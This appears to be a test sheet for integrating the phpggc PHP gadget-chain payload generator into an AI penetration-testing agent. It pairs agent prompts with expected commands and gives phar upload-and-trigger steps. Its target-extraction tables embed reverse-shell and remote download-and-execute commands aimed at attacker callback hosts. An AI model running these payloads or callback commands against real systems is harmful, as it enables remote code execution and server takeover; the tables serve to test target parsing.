# phpggc — Tier A scenarios

Single test sheet for the `phpggc` (PHP Generic Gadget Chains,
ambionics/phpggc upstream master, wrapper binary `phpggc` symlinked from
`/usr/local/bin/phpggc` to `/opt/phpggc/phpggc`) tool migration.

> NOTE: this is the PHP fork. For .NET deserialization (BinaryFormatter
> / Json.Net / LosFormatter / SoapFormatter etc.) use ysoserial; for
> Java deserialization (CommonsCollections / URLDNS / JRMPClient) use
> exploit-runner with ysoserial-java.

Sections:
1. Recommended sample for live verification
2. Narrative scenarios (paste into opensploit)
3. Target-extraction adversarial cases (≥20)
4. Failure-signature live-verify cases (≥3)
5. Open questions
6. Hand-off

---

## 1. Recommended sample for live verification

**N/A — phpggc has no network target.** phpggc generates serialized PHP
payloads (gadget chains) and writes them to stdout (or to a file via
`-o <path>`). There is no remote host to scan, attack, or authenticate
against. The "operands" of a phpggc call are:

- A CHAIN name (e.g., `Laravel/RCE1`) — a keyword from the bundled list
  of ~100+ PHP gadget chains spanning Symfony / Laravel / Monolog /
  Doctrine / Drupal / WordPress / Magento / Guzzle / Phalcon / Yii /
  CodeIgniter / SwiftMailer / SlimPHP / Phing / etc.
- Positional ARGUMENTS the chain expects (typically a PHP function +
  command string for RCE; src/dst paths for file-write; a single path
  for file-read or file-delete)
- An optional output ENCODING (`-b` base64, `-u` URL-encode, `-j` JSON,
  `-s` soft URL-encode) or wrapper (`--phar jpg|gif|tar|zip|phar`)
- An optional output path (`-o /session/<file>`) to redirect stdout

For LIVE VERIFICATION of the architecture path, four options:

**(a) Bare smoke test (recommended for CI / Tier A gate).** Use the
chain-list listing — exercises PHP CLI + the bundled phpggc tree load
without generating an actual payload:

```
phpggc -l
```

Stdout is the full chain table — each row formatted as
`<Framework>/<Code>  <Versions>  <Type>  <Vector>  *` (the trailing `*`
marks chains with detailed `-i` info available). Confirms
`/usr/local/bin/phpggc` symlink exists, PHP CLI is functional, and
`/opt/phpggc/phpggc` + `/opt/phpggc/lib/` load correctly. Exits 0.

**(b) Canonical Laravel RCE payload generation.** The single
most-published phpggc invocation in PHP deserialization PoCs:

```
phpggc Laravel/RCE1 system whoami
```

`Laravel/RCE1` is one of the most widely tested chains (Laravel 5.4.27
deserialization, CVE-2018-15133); `system whoami` embeds a benign
indicator. Output is RAW serialized PHP bytes (~500-1500 chars
depending on the chain) starting with `O:N:"ClassName":...`. Exercises
the full generate path (chain reflection + serialization).

**(c) Base64 + URL-encoded for HTTP transport.** The canonical chain
for HTTP-injectable payloads (cookie / query string / form data):

```
phpggc Laravel/RCE1 system whoami -b -u
```

Exercises the encoding path. Output is a URL-safe base64 string
(printable, no null bytes, no `+` `/` `=` interpretation issues).

**(d) Phar polyglot (file-upload deserialization).** Builds a binary
JPEG-PHAR polyglot file:

```
phpggc Symfony/RCE4 system id --phar jpg -o /session/payload.jpg
```

Exercises the polyglot builder + file-output path. Confirms `php-cli`
has `phar.readonly=Off` (or unset) and the `--phar jpg` keyword is
recognized.

For all four options, no network egress is needed — phpggc operates
entirely on the bundled phpggc tree and PHP CLI. Output may need to be
captured via `-o <path>` for `--phar` runs (binary bytes break
JSON-wrapped MCP responses); text outputs (`-l`, `-i`, `-b`, `-b -u`,
`-j`) are safe in stdout. RAW serialized PHP (default with no encoding
flags) contains null bytes and control chars — also unsafe in stdout
JSON envelopes; agents should default to `-b` or `-o <path>`.

Persistent test directory: standard `/session/` mount; phpggc reads its
chain library from `/opt/phpggc/` and writes only to the path specified
in `-o` (no other filesystem side effects in the normal flow).

---

## 2. Narrative scenarios (paste into opensploit)

### S1 — smoke test: confirm phpggc is functional

```
Run phpggc -l against the container so I can confirm the binary is on PATH and the bundled chain library loads.
```

**Watch:** Agent emits `phpggc -l`. target=`null` (no network target).
stdout is the full chain table — one row per chain, columns
`<Framework>/<Code>  <Versions>  <Type>  <Vector>  *` (header line plus
~100+ data rows). Exits 0. If the wrapper isn't on PATH the call fails
with `command not found` (container build issue, missing
`/usr/local/bin/phpggc` symlink). If the chain library is missing the
agent sees an empty / very short list (corrupt /opt/phpggc tree —
rebuild image).

### S2 — canonical Laravel RCE payload (raw serialized)

```
Generate a Laravel/RCE1 payload that runs `system whoami` when deserialized.
```

**Watch:** Agent emits `phpggc Laravel/RCE1 system whoami`. target=
`null`. stdout is a single RAW serialized PHP object — starts with
`O:` (e.g., `O:21:"GuzzleHttp\\Psr7\\AppendStream":1:{...}`) and
contains null bytes and control chars. The agent SHOULD then either
re-run with `-b` / `-b -u` / `-o <path>` (raw bytes won't survive
JSON-wrapped MCP response) or hand the output to a follow-up encoding
step. Common follow-on: `phpggc Laravel/RCE1 system whoami -b -u` for
HTTP transport.

### S3 — base64 + URL-encoded for HTTP transport

```
Generate a Laravel/RCE1 base64 + URL-encoded payload running `system whoami` for use as an HTTP cookie value.
```

**Watch:** Agent emits `phpggc Laravel/RCE1 system whoami -b -u`.
target=`null`. stdout is a single URL-safe base64 string (printable,
~700-1500 chars). The receiver will URL-decode then base64-decode then
`unserialize()`. For cookie values consider `-s` (soft URL-encode)
instead of `-u` to avoid the browser double-encoding `+`, `/`, `=`.

### S4 — list available chains for WordPress

```
List all phpggc chains targeting WordPress so I can pick one for the target site.
```

**Watch:** Agent emits `phpggc -l -n WordPress`. target=`null`. stdout
is the chain table filtered to rows with `WordPress` in the name
column — typically 3-5 chains (`WordPress/RCE1`, `WordPress/RCE2`,
etc.). Agent should pick the one whose `Versions` column matches the
target's confirmed WP version. Combine with `-cve <CVE-ID>` if
CVE-mapped.

### S5 — get info on a specific chain

```
Before generating, show me what arguments Symfony/RCE4 expects.
```

**Watch:** Agent emits `phpggc -i Symfony/RCE4`. target=`null`. stdout
is a multi-line block: chain name, vulnerable component (e.g.,
`Symfony/Component/HttpFoundation`), affected versions, vector
(typically `__destruct`), required positional arguments (e.g., `<func>
<arg>`), author, and any usage notes. Agent uses this to confirm
argument count and ordering before generating.

### S6 — phar polyglot for file-upload deserialization

```
Build a JPG/phar polyglot for Symfony/RCE4 running `system id` and save it to /session/payload.jpg so I can upload it.
```

**Watch:** Agent emits
`phpggc Symfony/RCE4 system id --phar jpg -o /session/payload.jpg`.
target=`null`. The `--phar jpg` keyword is recognized; `-o` writes the
binary polyglot to `/session/payload.jpg`. After the call, agent should
verify with `ls -l /session/payload.jpg` (or by reading the first few
bytes — `\xff\xd8\xff` JPEG magic) that the file landed and is the
expected size (typically 3-15 KB). Upload as `payload.jpg` and trigger
phar:// deserialization via a path like `phar://uploads/payload.jpg`
on a PHP function vulnerable to phar:// (`file_exists`, `is_file`,
`filesize`, `getimagesize`, `imagecreatefromstring`).

### S7 — JSON output for REST API exploitation

```
Generate a Monolog/RCE1 payload running `system whoami`, JSON-wrapped, for a REST API that JSON-decodes then unserializes the body.
```

**Watch:** Agent emits `phpggc Monolog/RCE1 system whoami -j`.
target=`null`. stdout is a JSON-wrapped string. Pair with `-b` if the
JSON parser doesn't tolerate raw control characters; chain becomes
`-b -j` (base64 first, then JSON wrap).

### S8 — soft URL-encoded for cookie injection

```
Generate a Doctrine/RCE1 payload running `system id`, encoded for a Cookie header (avoid double-encoding by the browser).
```

**Watch:** Agent emits `phpggc Doctrine/RCE1 system id -b -s`.
target=`null`. `-s` (soft URL-encode) only encodes characters that
break cookie syntax (whitespace, semicolons, control chars) — leaves
`+`, `/`, `=` alone so the browser doesn't double-encode them. Output
is a printable cookie-safe string.

### S9 — filter list by CVE

```
Find the phpggc chain corresponding to CVE-2018-15133.
```

**Watch:** Agent emits `phpggc -l -cve CVE-2018-15133`. target=`null`.
stdout is the chain table filtered to chains tagged with that CVE —
typically a single row (`Laravel/RCE1` for CVE-2018-15133). Agent uses
this when external CVE intel surfaces a vulnerable component but the
phpggc chain mapping isn't obvious from the framework name alone.

### S10 — write encoded payload to file

```
Generate a Monolog/RCE1 payload running `system id`, base64+URL-encoded, and save it to /session/payload.b64 for the next curl call.
```

**Watch:** Agent emits
`phpggc Monolog/RCE1 system id -b -u -o /session/payload.b64`.
target=`null`. `-o` writes the encoded payload to the specified path.
Agent then reads the file in a follow-up step (curl `--data-binary
@/session/payload.b64`, or splice into a JSON body via jq). Critical
because cli_in_container has no shell, so `phpggc ... > /session/x`
won't work — `-o` is phpggc's native file-output flag.

### S11 — verify gadget actually fires (-t)

```
Verify the Laravel/RCE1 chain actually fires by running -t with `system whoami` as the embedded command.
```

**Watch:** Agent emits `phpggc Laravel/RCE1 system whoami -t`.
target=`null`. WARNING: `-t` ACTUALLY DESERIALIZES the generated
payload locally — the embedded `system whoami` call runs ON THE
CONTAINER running phpggc. For `whoami` this is benign (prints the
container user — usually `root` or the venv user). For destructive
commands (rm -rf, reverse shells) `-t` is dangerous — the connect-back
shell would fire FROM THE CONTAINER, wrong source IP. NEVER use `-t`
with reverse shells or destructive commands.

### S12 — failure: unknown chain (case mismatch)

```
Generate a payload using chain name `laravel/rce1` (lowercase).
```

**Watch:** Agent emits `phpggc laravel/rce1 system whoami`. target=
`null`. phpggc exits non-zero with stderr containing `Unknown gadget
chain` (or `Chain not found`). Failure classified via signal `Unknown
gadget chain`. Remediation: chain names are CASE-SENSITIVE — run
`phpggc -l` to see the canonical PascalCase form (`Laravel/RCE1`).

### S13 — failure: missing required argument

```
Generate a payload using Laravel/RCE1 but forget to supply the function and command.
```

**Watch:** Agent emits `phpggc Laravel/RCE1`. target=`null`. phpggc
exits non-zero — usually prints the chain's expected argument list and
a `Usage:` block or `Required argument` message. Failure classified via
signal `Required argument` or `Usage:`. Remediation: run `phpggc -i
Laravel/RCE1` to see the argument signature; supply both positionals
(function name + command string).

### S14 — failure: phar build error (invalid extension)

```
Build a phar polyglot with extension `pdf` for Laravel/RCE1.
```

**Watch:** Agent emits
`phpggc Laravel/RCE1 system whoami --phar pdf -o /session/x.pdf`.
target=`null`. phpggc exits non-zero with stderr containing `Phar
wrapper failed` or similar — `pdf` isn't in phpggc's supported list
(jpg, gif, tar, zip, phar). Failure classified via signal `Phar
wrapper failed`. Remediation: use one of the supported extensions
(`--phar jpg` for image-upload sinks, `--phar tar`/`--phar zip` for
archive-upload sinks, `--phar phar` for native phar uploads).

---

## 3. Target-extraction adversarial cases (≥20)

The phpggc `tool.yaml` declares NO target_extraction rules. Every call
should return `target=null` because phpggc has no network target — it
generates serialized PHP payloads in-memory and writes them to stdout
(or to `-o <path>`). The "operands" of a phpggc call are:

(a) chain KEYWORD as the first positional (e.g., `Laravel/RCE1`)
(b) chain-specific argument STRINGS as subsequent positionals (e.g.,
    `system whoami` — function + command for RCE chains)
(c) encoding flags (`-b`, `-u`, `-j`, `-s`)
(d) output path (`-o <path>`) — local filesystem path, NOT a network endpoint
(e) phar wrapper (`--phar jpg|gif|tar|zip|phar`) — keyword
(f) discovery flags (`-l`, `-i`, `-cve`, `-n`)

None are network targets in the OpenSploit sense.

`reject_flags`: empty (no target-list ingestion concept).

`value_flags` includes the value-taking flags phpggc exposes (`-i`,
`-o`, `-w`, `-cve`, `-n`, `--phar`) plus the boolean flags listed for
safety so the DSL doesn't mis-parse them as taking the next argv as a
value.

The CRITICAL adversarial cases are: (1) IP / URL inside chain argument
strings — attacker-callback endpoints that look like targets but are
EGRESS, not engagement scope; (2) chain names that resemble URLs or
paths (e.g., `Laravel/RCE1` could naively be parsed as a path); (3)
filesystem paths in `-o` and `--phar` outputs that look filesystem-like
but aren't network targets.

### Happy-path cases (every one returns target=null)

| # | Command (binary `phpggc` omitted) | Expected target | Notes |
|---|---|---|---|
| 1 | `Laravel/RCE1 system whoami` | `null` | Canonical generate flow. |
| 2 | `Laravel/RCE1 system whoami -b -u` | `null` | Base64 + URL-encode for HTTP. |
| 3 | `Symfony/RCE4 system id -j` | `null` | JSON wrap for REST API. |
| 4 | `Monolog/RCE1 system id -b -s` | `null` | Soft URL-encode for cookie. |
| 5 | `Doctrine/RCE1 system whoami -b -u -o /session/payload.b64` | `null` | Encoded + file output. |
| 6 | `Symfony/RCE4 system id --phar jpg -o /session/payload.jpg` | `null` | Phar polyglot. |
| 7 | `-l` | `null` | List all chains. |
| 8 | `-l -n WordPress` | `null` | Filtered list. |
| 9 | `-l -cve CVE-2018-15133` | `null` | CVE-filtered list. |
| 10 | `-i Laravel/RCE1` | `null` | Chain info. |

### Help / introspection (target=null by definition)

| # | Command | Expected | Notes |
|---|---|---|---|
| H1 | `-h` | `target=null` | Help. |
| H2 | `--help` | `target=null` | Long form. |
| H3 | (no args) | `target=null` | Bare invocation. Non-zero exit, prints usage. |
| H4 | `-l` | `target=null` | List chains (no chain name = listing). |

### Adversarial — value_flag traps & "looks like a target" invariants

| # | Command | Expected | Notes |
|---|---|---|---|
| F1 | `Laravel/RCE1 system "bash -c '/bin/bash -i >& /dev/tcp/10.10.14.5/443 0>&1'"` | `target=null` | The IPv4 inside the chain command argument is the ATTACKER-CALLBACK endpoint, NOT a target. phpggc doesn't scope-validate egress callbacks. |
| F2 | `Laravel/RCE1 system "curl -s http://10.10.14.5:8000/x.sh \| bash"` | `target=null` | URL inside command arg is ATTACKER CALLBACK. The `\|` is part of the command STRING delivered to the target's `system()`, not a shell pipe phpggc interprets. |
| F3 | `Symfony/RCE4 passthru "wget http://attacker.tld/shell.php -O /tmp/s.php"` | `target=null` | Hostname inside command arg is ATTACKER CALLBACK. |
| F4 | `Monolog/RCE1 exec "nslookup attacker.dnslog.cn"` | `target=null` | DNS canary — ATTACKER CALLBACK. |
| F5 | `Laravel/RCE1 system "ping -c 1 192.168.1.1"` | `target=null` | The IP is INSIDE the embedded command string; NOT a phpggc target. |
| F6 | `Laravel/RCE1 system whoami` | `target=null` | Bare canonical case — clearly no target. |
| F7 | `laravel/rce1 system whoami` | `target=null` | Wrong case for chain name. May fail with `Unknown gadget chain`; target=null regardless. |
| F8 | `Laravel/RCE1 system whoami -B -U` | `target=null` | Wrong case for flags (phpggc uses lowercase `-b -u`). May fail with `Unknown option`; target=null regardless. |
| F9 | `Laravel/RCE1 system whoami -t` | `target=null` | `-t` is a boolean — runs the embedded command on the CONTAINER; still no network target involvement. |
| F10 | `Laravel/RCE1 system whoami -f` | `target=null` | `-f` (fast) is a boolean modifier; not a target. |
| F11 | `Laravel/RCE1 system whoami -a` | `target=null` | `-a` (ASCII strings) is a boolean modifier; not a target. |
| F12 | `Drupal/FW1 /var/www/shell.php /tmp/shell.php` | `target=null` | File-write chain — TWO POSITIONAL FILE PATHS as chain args. NEITHER is a network target — both are TARGET-SIDE filesystem paths the gadget acts on when deserialized. |
| F13 | `Symfony/RCE4 system id --phar jpg -o /session/payload.jpg` | `target=null` | `--phar jpg` and `-o /session/payload.jpg` are LOCAL OUTPUT paths/keywords, NOT targets. |
| F14 | `Monolog/RCE1 system id -o /session/x.b64` | `target=null` | `-o` is a LOCAL OUTPUT PATH, not a target. |
| F15 | `Laravel/RCE1 system whoami -w /opt/phpggc/templates/wrapper/php_wrapper.txt` | `target=null` | `-w` is a LOCAL WRAPPER FILE PATH, not a target. |
| F16 | `Laravel/RCE1 system "$(curl http://attacker/x)"` | `target=null` | Subshell syntax inside the command arg — interpreted by the TARGET's shell at deserialize time, not by phpggc. ATTACKER CALLBACK. |
| F17 | `Laravel/RCE1 system whoami -b -u --phar phar -o /session/x.phar` | `target=null` | Multiple flags. Output is a phar archive at a local /session/ path; not a target. |
| F18 | `WordPress/RCE2 system whoami` | `target=null` | Different framework / chain. Still no target. |
| F19 | `Magento/RCE1 system whoami` | `target=null` | Magento chain. Still no target. |
| F20 | `Guzzle/FW1 /var/www/shell.php /tmp/src.php` | `target=null` | Guzzle file-write chain. Two filesystem paths, neither is a target. |
| F21 | `Phalcon/RCE1 system id` | `target=null` | Phalcon chain. Still no target. |
| F22 | `Laravel/RCE1 system "calc"` | `target=null` | Empty-shaped command (treated as program name `calc`). target=null regardless. |
| F23 | `Laravel/RCE1 system ""` | `target=null` | Empty command string (edge case — may fail with `Required argument` or generate an empty-payload). target=null regardless. |
| F24 | `Laravel/RCE1 system "whoami; id; uname -a"` | `target=null` | Multi-command shell-style string inside the command arg — interpreted at deserialization time on TARGET, not by phpggc. NOT a target. |
| F25 | `Yii/RCE1 system "id"` | `target=null` | Yii chain. Still no target. |
| F26 | `-i Laravel/RCE1` | `target=null` | `-i <chain>` — chain name VALUE is a keyword, not a target. |
| F27 | `-l -n attacker.com` | `target=null` | `-n` filter pattern that LOOKS like a hostname — it's a SUBSTRING regex matched against chain names. NOT a target. |
| F28 | `-l -cve CVE-2024-12345` | `target=null` | `-cve` value is a CVE identifier keyword. NOT a target. |

### Multi-positional & ambiguous cases

| # | Command | Expected | Notes |
|---|---|---|---|
| M1 | `Laravel/RCE1 system whoami && phpggc -h` | `target=null` (per call) | Shell `&&` won't run inside cli_in_container (no shell). Per-call: each parses to target=null. |
| M2 | `Laravel/RCE1 -b -u system whoami` | `target=null` | Flag order — phpggc allows flags interleaved with positionals. NOT a target. |
| M3 | `Laravel/RCE1 system whoami extra-positional` | `target=null` | Stray positional — phpggc may reject or ignore based on chain signature; target=null regardless. |
| M4 | (no args) | `target=null` | Bare invocation — phpggc prints usage / exits non-zero; still target=null. |

### Stdin trap (phpggc doesn't read stdin in normal flow)

| # | Command (LLM might naively try) | What happens | Correct shape |
|---|---|---|---|
| P1 | `echo "whoami" \| phpggc Laravel/RCE1 system` | cli_in_container HAS NO SHELL. The `\|` is passed as a literal arg or rejected. phpggc does NOT read commands from stdin — chain args are positional. | Use `phpggc Laravel/RCE1 system whoami`. |
| P2 | `phpggc Laravel/RCE1 system whoami \| base64` | Shell pipe doesn't work in cli_in_container. To get base64, use `-b` (phpggc's native flag). | `phpggc Laravel/RCE1 system whoami -b`. |
| P3 | `phpggc Laravel/RCE1 system whoami > /session/out.bin` | Shell redirect doesn't work in cli_in_container. Use phpggc's native `-o <path>` for file output. | `phpggc Laravel/RCE1 system whoami -o /session/out.bin`. |
| P4 | `phpggc Laravel/RCE1 system whoami \| xxd` | Shell pipe doesn't work. To inspect bytes, run with `-o /session/x.bin` and read back. | `phpggc Laravel/RCE1 system whoami -o /session/x.bin` then `read /session/x.bin`. |

---

## 4. Failure-signature live-verify cases (≥3)

| # | Layer | Test | failure_signature `signal` | Status |
|---|---|---|---|---|
| 1 | Chain / unknown chain | `phpggc laravel/rce1 system whoami` (case mismatch) | `Unknown gadget chain` | PENDING live verify |
| 2 | Chain / unknown chain | `phpggc Notarealchain/RCE1 system whoami` | `Unknown gadget chain` OR `Chain not found` | PENDING live verify |
| 3 | Argument / required missing | `phpggc Laravel/RCE1` (no chain args) | `Required argument` OR `Usage:` | PENDING live verify |
| 4 | Argparse / unknown flag | `phpggc Laravel/RCE1 system whoami --notaflag` | `Unknown option` OR `Usage:` (fallback) | PENDING live verify |
| 5 | File / output write fail | `phpggc Laravel/RCE1 system whoami -o /readonly/x.b64` | `Could not write` OR `Permission denied` | PENDING live verify |
| 6 | Phar / unsupported extension | `phpggc Laravel/RCE1 system whoami --phar pdf -o /session/x.pdf` | `Phar wrapper failed` OR `Unknown option` | PENDING live verify |
| 7 | PHP runtime / phar.readonly | (manual: set phar.readonly=1 in php.ini, then run --phar) | `Could not create phar` | PENDING live verify (manual fixture) |
| 8 | -t execution | `phpggc Laravel/RCE1 system "/nonexistent-binary" -t` | non-zero exit + stderr from -t deserialization | PENDING live verify |

### Layer diversity (SKILL #11) — achieved

8 distinct layers exercised: unknown-chain (case mismatch), unknown-
chain (literal nonexistent name), argparse required-argument, argparse
unknown-flag, file-write permission failure, phar unsupported-extension,
phar.readonly php.ini fixture, -t execution failure. Resource layer
(PHP CLI OOM during chain reflection) is hard to provoke deliberately
in a 128 MB container; defer to Wave 9 live runs against real
engagement targets.

---

## 5. Open questions

1. **target_extraction = empty list — confirmed correct?** phpggc has
   no network target. Same shape as ysoserial / ilspy / john / hashcat
   / volatility / searchsploit — all six are offline analysis or
   payload-generation tools operating on local artifacts (or
   in-memory PHP reflection in phpggc's case). Verify the plugin
   handles `target=null` gracefully (doesn't reject the call; doesn't
   try to validate "null" against engagement scope). The CRITICAL
   adversarial surface is the IP / URL embedded inside chain
   argument strings (cases F1, F2, F3, F4, F5, F16) — these are
   ATTACKER-CALLBACK endpoints, NOT engagement-scope targets. If the
   plugin has a default "any IP-shaped value extracts as target" rule,
   those callback IPs would trip it incorrectly. Cross-check that the
   DSL only inspects flag VALUES (chain keywords, file paths, phar
   keywords, CVE IDs), not the semantic content of chain command-arg
   strings.

2. **Stdout-pipe limitation.** cli_in_container uses subprocess spawn
   with NO shell — so `phpggc ... | base64` won't work. phpggc
   sidesteps this for encoding via native flags (`-b`, `-u`, `-j`,
   `-s`); for file output it provides `-o <path>` natively. Verify the
   plugin's run_cli interface actually supports `-o`-style file output
   (phpggc writes the file itself; no MCP-side `output_path`
   redirection needed). If the agent tries `>`-redirection it'll get a
   literal `>` arg passed to phpggc (which fails). Document as a top-
   level gotcha (already done) and add a hand-off note for the
   plugin's argv-construction layer.

3. **Output-redirect convention vs ysoserial's `output_path`.** ysoserial
   uses run_cli's `output_path` field for binary `-o raw` output (because
   ysoserial doesn't have a native `-o <path>` flag). phpggc HAS a native
   `-o <path>` flag — should the plugin's argv builder pass through
   `-o /session/<file>` directly OR translate run_cli's `output_path`
   field into a `-o` argv? Current tool.yaml documents `-o` as phpggc's
   native flag (correct). The translation question is plugin-side —
   either approach works at the phpggc layer, but the plugin should
   pick ONE convention and document it. Defer to plugin design.

4. **Chain name discovery — should the plugin auto-suggest?** When the
   agent passes `phpggc laravel/rce1 ...` (lowercase) it'll fail with
   `Unknown gadget chain`. The plugin could pre-validate the chain
   name against a cached chain table and suggest the canonical form
   (`Laravel/RCE1`). Currently NOT implemented — the agent gets the
   raw phpggc error and must re-run with `-l`. Acceptable for v1; add
   if observed friction in Wave 9 live runs.

5. **Phar wrapper file (`-w`).** The `-w <wrapper-file>` flag accepts
   a path to a wrapper template (typically
   `/opt/phpggc/templates/wrapper/php_wrapper.txt` from the upstream
   tree). The wrapper embeds the serialized payload inside a
   `<?php ... unserialize(...) ?>` shim — useful for sinks that expect
   PHP source instead of raw serialized bytes (e.g., a `eval()` sink
   that takes the file content). Should the plugin auto-resolve `-w`
   to /opt/phpggc/templates/... if the agent passes a basename?
   Currently agents must pass a full path. Acceptable; document in
   gotchas if friction observed.

6. **Embedded callback URL — engagement-scope handling.** When chain
   args contain a callback URL (e.g.,
   `Laravel/RCE1 system "curl http://10.10.14.5/x.sh | bash"`), the
   URL is the ATTACKER's infrastructure, NOT the engagement-scope
   target. phpggc generates the payload locally; the actual callback
   connection happens later on the TARGET when it deserializes the
   bytes. The DSL should NOT extract the embedded URL as a target.
   But should the LLM-side guardrail check whether the embedded
   callback host is the agent's OWN infrastructure (whitelist of
   known attacker IPs), to prevent accidentally pointing the payload
   at someone else's server? Defer to plugin design; for now the
   gotchas note this is the LLM's responsibility.

7. **Chain version ranges.** Many phpggc chains list strict version
   ranges (e.g., `Laravel/RCE1` → Laravel 5.4.27). Targets running
   versions OUTSIDE the listed range may have a different gadget
   structure — payload deserializes but the gadget doesn't fire.
   `phpggc -i <chain>` shows the affected version range. Should the
   master-agent prompt include a hard rule "always run -i and confirm
   target version before generating"? Currently mentioned in tool.yaml
   gotchas. Defer to Wave 9 live runs to see if friction surfaces.

8. **`-t` runs the embedded command on the container.** The `-t` flag
   literally deserializes the payload locally to verify the gadget
   fires — meaning the embedded function call (e.g., `system whoami`)
   runs ON THE CONTAINER, not on the target. For benign indicators
   (`whoami`, `id`) this is harmless; for reverse shells the shell
   would connect FROM THE CONTAINER (wrong source IP, may contaminate
   logs). The gotcha note explicitly warns against `-t` with non-
   benign commands. Defer to live verify with `-t` and observe what
   actually fires.

9. **Output normalization & failure-stream ordering (legacy parity).**
   The legacy mcp-server.py performed two pieces of post-processing
   that kind:cli does NOT replicate by default:
   (a) `payload = stdout.rstrip("\n")` — phpggc emits a trailing
       newline after the serialized bytes / encoded string. The legacy
       server stripped it before reporting `payload_length`. kind:cli
       hands the agent the raw stdout INCLUDING the trailing `\n`. For
       `-b` and `-b -u` outputs the trailing newline is benign (HTTP
       transport tolerates it) but agents splicing the payload into a
       JSON body via jq / `--data-binary` may need to strip it
       themselves. For RAW serialized output the trailing newline is
       NOT part of the serialized PHP object — `unserialize()` will
       still succeed but a strict checksum would differ. Document as
       an agent-side normalization step or have the plugin auto-rstrip
       on stdout capture.
   (b) Failure stream priority: legacy reported errors as
       `f"phpggc failed: {stderr or stdout}"` — i.e., stderr wins,
       falling back to stdout when stderr is empty. This matters
       because phpggc prints SOME error messages to stdout (e.g., the
       `Usage:` banner on bare invocation) and others to stderr
       (`Unknown gadget chain`). kind:cli surfaces both streams
       separately, so failure_signatures regex matching needs to scan
       BOTH stdout and stderr. The current failure_signatures table in
       tool.yaml lists signal strings without specifying which stream
       they appear on; verify in Wave 9 live runs that the matcher
       inspects both. Specifically: `Usage:` typically goes to stdout
       (not stderr), while `Unknown gadget chain` goes to stderr.

---

## 6. Hand-off

- **Tool**: phpggc (kind:cli) — ambionics/phpggc upstream master via
  PHP CLI
- **Status**: tool.yaml authored end-to-end (kind:cli, binary:phpggc,
  5 min max_runtime, no target_extraction); scenarios.md written.
  Dockerfile updated — base image is `kalilinux/kali-rolling`, so the
  python3-pip / python3-venv → python3-full swap was applied. ALSO
  added a `/usr/local/bin/phpggc` SYMLINK to `/opt/phpggc/phpggc` so
  the kind:cli binary on PATH matches `binary: phpggc` (phpggc's
  shebang `#!/usr/bin/env php` runs the script directly — no shell
  wrapper needed). mcp-server.py UNTOUCHED (auto-inherits run_cli;
  rollback path).
- **Vendor reality check (SKILL #5)**: phpggc is the PHP fork
  (ambionics/phpggc — distinct from ysoserial.NET and ysoserial-java).
  It uses positional `<chain> <args>...` syntax with single-dash
  short flags (`-l`, `-i`, `-o`, `-w`, `-cve`, `-n`, `-b`, `-u`, `-j`,
  `-s`, `-t`, `-f`, `-a`, `-h`) and one long flag (`--phar`).
  Fundamentally different DSL from ysoserial.NET (single-dash
  `-g/-f/-c/-o/-p`) and the Java fork (positional `<gadget>
  <command>`). tool.yaml + scenarios.md follow the vendor reality.
  The `see_also` and `never_use_for` sections route .NET requests to
  ysoserial and Java requests to exploit-runner with ysoserial-java.
- **Image**: `ghcr.io/silicon-works/mcp-tools-phpggc:latest` — needs
  rebuild during Wave 9 batch to pick up mcp-common 0.3.0, the
  python3-full swap, and the new `/usr/local/bin/phpggc` symlink.
- **target_extraction = empty list**: explicit design choice. phpggc
  has no network target; the plugin should treat target=null as "no
  scope validation needed" for this tool. Same shape as ysoserial /
  ilspy / john / hashcat / volatility / searchsploit. The CRITICAL
  invariant: IP / URL strings inside chain argument STRINGS must NOT
  be auto-extracted as targets — they're ATTACKER-CALLBACK endpoints.
  See Open Question #1 and target-extraction adversarial cases F1-F5,
  F16.
- **Wave 7.13**: of Feature 35 / Tier A migration.
- **Live-verify pending**: paste S1-S14 against the container for
  end-to-end verification. Failure signatures 1-2 (unknown chain,
  case-mismatch and literal-nonexistent) verifiable against any
  container; 3-4 (argparse) standard; 5 (file-write fail) standard;
  6 (phar unsupported extension) standard; 7 (phar.readonly fixture)
  requires manual php.ini corruption; 8 (-t execution) verifiable but
  produces noisy output.
- **Cleanup**: no legacy `target_extraction_tests.md`,
  `failure_signature_tests.md`, or `__pycache__/` files were present
  in the phpggc/ directory (verified via initial Read phase —
  directory contained only Dockerfile, mcp-server.py,
  requirements.txt, tool.yaml) — nothing to remove.
- **Dockerfile**: TWO changes applied — (1) replaced
  `python3 python3-pip python3-venv` with `python3-full` (Kali rolling
  repos no longer ship the split packages); (2) added a
  `/usr/local/bin/phpggc` symlink to `/opt/phpggc/phpggc` so the
  kind:cli PATH binary matches tool.yaml's `binary: phpggc`. php-cli,
  the upstream phpggc git clone, venv setup, mcp-common install,
  mcp-server.py copy, and CMD all unchanged.

Authored: 2026-04-25.
